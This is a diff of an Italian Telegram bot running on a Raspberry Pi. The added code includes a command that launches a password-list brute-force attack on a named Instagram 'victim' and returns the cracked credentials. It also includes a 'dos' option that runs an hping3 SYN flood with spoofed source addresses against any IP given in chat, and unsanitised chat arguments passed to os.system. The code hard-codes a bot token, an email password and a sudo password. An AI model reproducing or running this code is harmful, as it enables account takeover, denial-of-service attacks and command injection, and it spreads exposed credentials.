@@ -11,6 +11,13 @@ import datetime
 from datetime import datetime, timedelta
 import smtplib, ssl
 from email.mime.text import MIMEText
+import subprocess
+import sys
+from threading import Thread
+import numpy as np 
+import cv2 
+import pyautogui
+import socket 
 
 TOKEN = '790486292:AAE2_Dowg0hRAjypMxlup73MAXOHglv6v2s'
 updater = Updater(TOKEN, use_context=True)
@@ -262,9 +269,46 @@ def frasi23(update,context):
 	context.bot.send_message(chat_id=update.effective_chat.id,text=emoji.emojize(":double_exclamation_mark:"))
 	time.sleep(3)
 #####################################################
-
 def callback_minute1(context: telegram.ext.CallbackContext):
 	
+	def client_program(message):
+		host = "192.168.1.49" # as both code is running on same pc
+		port = 5003  # socket server port number
+		client_socket = socket.socket()  # instantiate
+		client_socket.connect((host, port))  # connect to the server
+		print(message)
+		client_socket.send(message.encode())  # send message
+		client_socket.close()
+		
+	def procedura_invio(data,corpo):
+		port = 587  # For starttls
+		smtp_server = "smtp.gmail.com"
+		sender_email = "orionperseus999@gmail.com"
+		receiver_email = "claudio.rimensi.1996.uni@gmail.com"
+		password = "orologio96"
+		msg = MIMEText(f'Appuntamento: {str(data)} {str(corpo)}')
+		msg['Subject'] = 'Appuntamento immimente!!!'
+		msg['From'] = sender_email
+		msg['To'] = receiver_email
+
+		context = ssl.create_default_context()
+		try:
+			with smtplib.SMTP(smtp_server, port) as server:
+				server.ehlo()  # Can be omitted
+				server.starttls(context=context)
+				server.ehlo()  # Can be omitted
+				server.login(sender_email, password)
+				server.sendmail(sender_email, receiver_email, msg.as_string())
+				# tell the script to report if your message was sent or which errors need to be fixed 
+				print('Sent')
+				
+		except (gaierror, ConnectionRefusedError):
+			print('Failed to connect to the server. Bad connection settings?')
+		except smtplib.SMTPServerDisconnected:
+			print('Failed to connect to the server. Wrong user/password?')
+		except smtplib.SMTPException as e:
+			print('SMTP error occurred: ' + str(e))
+			
 	def send():
 		fn = "claudio_note.txt"
 		f = open(fn)
@@ -286,38 +330,15 @@ def callback_minute1(context: telegram.ext.CallbackContext):
 			futuredate1 = str(futuredate1)
 			futuredate1 = futuredate1[:10]
 			data_finale=datetime.strptime(futuredate, '%Y-%m-%d').strftime('%d/%m/%Y')
-			data_finale1=datetime.strptime(futuredate1, '%Y-%m-%d').strftime('%d/%m/%Y')            
+			data_finale1=datetime.strptime(futuredate1, '%Y-%m-%d').strftime('%d/%m/%Y')           
 			if data_adesso != data_finale:
 				pass
 				
-			elif data_adesso == data_finale: #or data_adesso == data_finale1:
-				port = 587  # For starttls
-				smtp_server = "smtp.gmail.com"
-				sender_email = "orionperseus999@gmail.com"
-				receiver_email = "claudio.rimensi.1996.uni@gmail.com"
-				password = "orologio96"
-				msg = MIMEText(f'Appuntamento: {str(data)} {str(corpo)}')
-				msg['Subject'] = 'Appuntamento immimente!!!'
-				msg['From'] = sender_email
-				msg['To'] = receiver_email
-
-				context = ssl.create_default_context()
-				try:
-					with smtplib.SMTP(smtp_server, port) as server:
-						server.ehlo()  # Can be omitted
-						server.starttls(context=context)
-						server.ehlo()  # Can be omitted
-						server.login(sender_email, password)
-						server.sendmail(sender_email, receiver_email, msg.as_string())
-						# tell the script to report if your message was sent or which errors need to be fixed 
-						print('Sent')
-						
-				except (gaierror, ConnectionRefusedError):
-					print('Failed to connect to the server. Bad connection settings?')
-				except smtplib.SMTPServerDisconnected:
-					print('Failed to connect to the server. Wrong user/password?')
-				except smtplib.SMTPException as e:
-					print('SMTP error occurred: ' + str(e))
+			elif data_adesso == data_finale:
+				procedura_invio(data,corpo)
+				client_program("start Ti ho inviato un appuntamento/i per email. CONTROLLA!!!")
+				
+	
 			
 		f.close
 	send()
@@ -345,48 +366,169 @@ def callback_minute(context: telegram.ext.CallbackContext):
 def business(update,context):
 	comando1=f'adb shell screencap -p /sdcard/screencap.png'
 	comando2=f'adb pull /sdcard/screencap.png'
+	comando3= f'adb shell dumpsys battery > stato_telefono.txt'
 	os.system(comando1)
 	os.system(comando2)
+	os.system(comando3)
 	time.sleep(2)
+	with open("stato_telefono.txt","r") as file:
+		leggo1=file.read()
 	context.bot.send_photo(chat_id=update.effective_chat.id,photo=open('/home/pi/Desktop/bot/screencap.png','rb'))
 	context.bot.sendMessage(chat_id=update.effective_chat.id,text="Ricordati che quando ti invio lo screenshot il contatore sara' 10 in meno")
 	context.bot.send_message(chat_id=update.effective_chat.id,text=emoji.emojize(":grinning_face_with_smiling_eyes:"))
+	context.bot.sendMessage(chat_id=update.effective_chat.id,text="Ora ti invio lo stato del telefono..")
+	time.sleep(1)
+	context.bot.sendMessage(chat_id=update.effective_chat.id,text=leggo1)
+##################################################################
+def control_header(update,context):
+	url=context.args[0:]
+	url=" ".join(url)
+	comando=f'python3  /home/pi/Desktop/bot/shcheck.py {url} > risultato.txt'
+	os.system(comando)
+	with open("risultato.txt","r") as file:
+		leggo2= file.read()
 
-###########################################################
+	with open("informazioni","r") as file:
+		leggo3= file.read()
+	context.bot.send_message(chat_id=update.effective_chat.id,text=leggo3 + emoji.emojize(":grinning_face_with_smiling_eyes:"))
+	time.sleep(2)
+	context.bot.send_message(chat_id=update.effective_chat.id,text="Ecco i risultati")
+	time.sleep(1)
+	context.bot.send_message(chat_id=update.effective_chat.id,text=leggo2 + emoji.emojize(":grinning_face_with_smiling_eyes:"))
+################################################################################################	
+def repo(update,context):
+	comando=f'bash /home/pi/Desktop/bot/repo.sh'
+	os.system(comando)
+	with open("repo.txt","r") as fp:
+		line = fp.readline()
+		cnt = 1
+		while line:
+			print("Line {}: {}".format(cnt, line.strip()))
+			with open("repo2.txt","a") as file2:
+				file2.write("Line {}: {}".format(cnt, line.strip()))
+				file2.write("\n")
+				file2.write("\n")
+				
+			line = fp.readline()
+			cnt += 1
+			
+	with open("repo2.txt","r") as file:
+		line2 = file.read()	
+		
+	context.bot.send_message(chat_id=update.effective_chat.id,text=line2 + emoji.emojize(":grinning_face_with_smiling_eyes:"))
+	comando3="rm /home/pi/Desktop/bot/repo2.txt"
+	os.system(comando3)
+
+########################################################################################	
+def instagram(update,context):
+	username=context.args[0:]
+	username=" ".join(username)
+	print(username)
+	comando=f'gnome-terminal --tab -- bash -c  "python3 /home/pi/Desktop/Instagram/instagram.py {username} /home/pi/Desktop/Instagram/password_list.txt -m 2"'
+	os.system(comando)
+	emoction=emoji.emojize(":grinning_face_with_smiling_eyes:")
+	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f'Il programma sta lavorando {emoction}')
+#########################################################################################	
+def instagram_aggiornamento(update,context):
+	emoction=emoji.emojize(":grinning_face_with_smiling_eyes:")
+	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f'Provo ad inviare il file contenete le credenziali di accesso {emoction}')
+	try:
+		context.bot.send_document(chat_id=update.effective_chat.id,document=open('/home/pi/Desktop/Instagram/accounts.txt','rb'))
+		os.remove('/home/pi/Desktop/Instagram/accounts.txt')
+	except FileNotFoundError:
+		context.bot.sendMessage(chat_id=update.effective_chat.id,text='Mi dispiace ma non ho trovato file,quindi il programma non ha ancora finito il suo lavoro')
+##########################################################################################
+def callback_minute2(context: telegram.ext.CallbackContext):
+	indirizzo="scan"
+	secondo="scan"
+	context.bot.sendMessage(chat_id='502522267',text='Scanning network in corso')
+	sudoPassword = 'omen96'
+	command = f'python3 /home/pi/Desktop/bot/network_analyis.py {indirizzo} {secondo}'
+	os.system(f'echo %s|sudo -s %s' % (sudoPassword, command))
+	time.sleep(5)
+	image = pyautogui.screenshot() 
+	image = cv2.cvtColor(np.array(image),cv2.COLOR_RGB2BGR) 
+	cv2.imwrite("image1.png", image)
+	context.bot.send_photo(chat_id='502522267',photo=open('/home/pi/Desktop/bot/image1.png','rb'))	
+##################################################################
 def help1(update,context):
 	context.bot.sendMessage(chat_id=update.effective_chat.id,text='Ecco quello che posso fare per voi, per adesso...')
-	time.sleep(1)
 	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/meteo [nome_citta]: Vi do le previsioni del meteo della citta che volete")
-	time.sleep(1)
 	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/numeri: Vi do random 6 numeri se volete giocare al superenalotto :) Che la fortuna possa essere sempre dalla vostra parte")
-	time.sleep(1)
 	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/password [password_Claudio]")
-	time.sleep(1)
 	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/password1 [password_Eleonora]")
-	time.sleep(1)
-	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/nota ")
-	time.sleep(1)
+	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/nota [leggi : se vuoi leggere le note]")
 	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/frasi Frasi motivazionali ")
-	time.sleep(1)
-	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/business")
-	time.sleep(1)
+	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/bruteforce_instagram [nome_vittima_instagram]")
+	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/agg_insta")
+	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/header [url] : Mostra se ci sono parametri di sicurezza negli header del web server")
+	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/repo : Lista di tutti i repo del mio padrone")
+	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/scan : ([indirizzo_ip] oppure [indirizzo_ip] dos)")
 	context.bot.sendMessage(chat_id=update.effective_chat.id,text="/help: Vi mostro i comandi che potete scrivere perche io vi possa rispondere")
+#######################################################################################
+def scan(update,context):
+	indirizzo=context.args[0:]
+	indirizzo=" ".join(indirizzo)
+	
+	if indirizzo.find("dos") != -1:
+		context.bot.sendMessage(chat_id=update.effective_chat.id,text='Dos attacking... Mi sacrifico :D')
+		indirizzo=indirizzo.replace('dos','')
+		sudoPassword = 'omen96'
+		command = f'hping3 -c 1000 -d 120 -S -w 64 -p 21 --flood --rand-source {indirizzo}'
+		os.system(f'echo %s|sudo -s %s' % (sudoPassword, command))
+		context.bot.sendMessage(chat_id=update.effective_chat.id,text='Dos attacking done')
+		
+	if indirizzo=="":
+		indirizzo="scan"
+		secondo="scan"
+		context.bot.sendMessage(chat_id=update.effective_chat.id,text='Scanning network in corso')
+		sudoPassword = 'omen96'
+		command = f'python3 /home/pi/Desktop/bot/network_analyis.py {indirizzo} {secondo}'
+		os.system(f'echo %s|sudo -s %s' % (sudoPassword, command))
+		time.sleep(5)
+		image = pyautogui.screenshot() 
+		image = cv2.cvtColor(np.array(image),cv2.COLOR_RGB2BGR) 
+		cv2.imwrite("image1.png", image)
+		context.bot.send_photo(chat_id=update.effective_chat.id,photo=open('/home/pi/Desktop/bot/image1.png','rb'))
+		
+	elif indirizzo!="scan":
+		secondo="ping"
+		context.bot.sendMessage(chat_id=update.effective_chat.id,text=f'1- Ping indirizzo {indirizzo}')
+		sudoPassword = 'omen96'
+		command = f'python3 /home/pi/Desktop/bot/network_analyis.py {indirizzo} {secondo}'
+		os.system(f'echo %s|sudo -s %s' % (sudoPassword, command))
+		image = pyautogui.screenshot() 
+		image = cv2.cvtColor(np.array(image),cv2.COLOR_RGB2BGR) 
+		cv2.imwrite("image1.png", image)
+		context.bot.send_photo(chat_id=update.effective_chat.id,photo=open('/home/pi/Desktop/bot/image1.png','rb'))
+		time.sleep(1)
+		secondo="port"
+		context.bot.sendMessage(chat_id=update.effective_chat.id,text=f'2- Scanning port {indirizzo}')
+		sudoPassword = 'omen96'
+		command = f'python3 /home/pi/Desktop/bot/network_analyis.py {indirizzo} {secondo}'
+		os.system(f'echo %s|sudo -s %s' % (sudoPassword, command))
+		time.sleep(4)
+		image = pyautogui.screenshot() 
+		image = cv2.cvtColor(np.array(image),cv2.COLOR_RGB2BGR) 
+		cv2.imwrite("image1.png", image)
+		context.bot.send_photo(chat_id=update.effective_chat.id,photo=open('/home/pi/Desktop/bot/image1.png','rb'))
 #######################################################################################
 def nota(update,context):
 	print("Sono entrato nella sezione delle note...\n")
-	note=context.args[0:]
-	note=" ".join(note)
-	if note != "" and note != "cancella":
-			
-		with open("claudio_note.txt", "a") as file:
-			data=file.write(note)
-			data=file.write("\n")
-			
+	data=context.args[0]
+	
+	#cancello
+	if data == "cancella":
+		file = open("claudio_note.txt", "w").close()
 		time.sleep(1)
-		context.bot.send_message(chat_id=update.effective_chat.id,text="Scrittura avvenuta correttamente sul file") 
+		context.bot.send_message(chat_id=update.effective_chat.id,text="Eliminazione avvenuta correttamente del contenuto nel file") 
 		context.bot.send_message(chat_id=update.effective_chat.id,text=emoji.emojize(":grinning_face_with_smiling_eyes:"))
-		
-	elif note == "":
+	
+	
+	
+	#leggo
+	if data=="leggi":
+		print("entro")
 		def delete():
 			fn = "claudio_note.txt"
 			f = open(fn)
@@ -425,16 +567,29 @@ def nota(update,context):
 		time.sleep(1)
 		context.bot.send_message(chat_id=update.effective_chat.id,text="Lettura avvenuta correttamente del file") 
 		context.bot.send_message(chat_id=update.effective_chat.id,text=emoji.emojize(":grinning_face_with_smiling_eyes:"))
-
 	
-	if note == "cancella":
-		file = open("claudio_note.txt", "w").close()
-		time.sleep(1)
-		context.bot.send_message(chat_id=update.effective_chat.id,text="Eliminazione avvenuta correttamente del contenuto nel file") 
-		context.bot.send_message(chat_id=update.effective_chat.id,text=emoji.emojize(":grinning_face_with_smiling_eyes:"))
+	#scrivi
+	if data!="":	
+		note=context.args[1:]
+		note=" ".join(note)
+		giorni_della_settimana=["Lunedi","Martedi","Mercoledi","Giovedi","Venerdi","Sabato","Domenica"]
+		data= data.split("/")
+		data_appuntamento=datetime(int(data[2]),int(data[1]),int(data[0]))
+		data_vera_propria=f'{data[0]}/{data[1]}/{data[2]}'
+		data_appuntamento=data_appuntamento.weekday()
+		giorno_del_mese= giorni_della_settimana[data_appuntamento]
 
-
-
+		if note != "" and note != "cancella":
+				
+			with open("claudio_note.txt", "a") as file:
+				data=file.write(f"{data_vera_propria} --> {giorno_del_mese} : {note}")
+				data=file.write("\n")
+				
+			time.sleep(1)
+			context.bot.send_message(chat_id=update.effective_chat.id,text="Scrittura avvenuta correttamente sul file") 
+			context.bot.send_message(chat_id=update.effective_chat.id,text=emoji.emojize(":grinning_face_with_smiling_eyes:"))	
+	
+	
 #########################################################################################
 #FUNZIONE PRINCIPALE     
 def main():
@@ -443,14 +598,20 @@ def main():
 	dp.add_handler(CommandHandler('help', help1))
 	dp.add_handler(CommandHandler('numeri', numeri))
 	dp.add_handler(CommandHandler('nota',nota))
+	dp.add_handler(CommandHandler('scan',scan,pass_args=True,pass_chat_data=True))
 	dp.add_handler(CommandHandler('frasi',frasi23))
 	dp.add_handler(CommandHandler('password',password,pass_args=True,pass_chat_data=True))
 	dp.add_handler(CommandHandler('password1',password1,pass_args=True,pass_chat_data=True))
 	dp.add_handler(CommandHandler('meteo',meteo,pass_args=True,pass_chat_data=True))
 	dp.add_handler(CommandHandler('business',business))
-
-	job_minute = j.run_repeating(callback_minute, interval=10800, first=0)
+	dp.add_handler(CommandHandler('bruteforce_instagram',instagram,pass_args=True,pass_chat_data=True))
+	dp.add_handler(CommandHandler('agg_insta',instagram_aggiornamento))
+	dp.add_handler(CommandHandler('repo',repo))
+	dp.add_handler(CommandHandler('header',control_header,pass_args=True,pass_chat_data=True))
 	job_minute1 = j.run_repeating(callback_minute1, interval=18000, first=0)
+	job_minute2 = j.run_repeating(callback_minute2, interval=18000, first=0)
+	job_minute = j.run_repeating(callback_minute, interval=10800, first=0)
+	
 	
 	unknown_handler = MessageHandler(Filters.command, unknown)
 	dp.add_handler(unknown_handler)
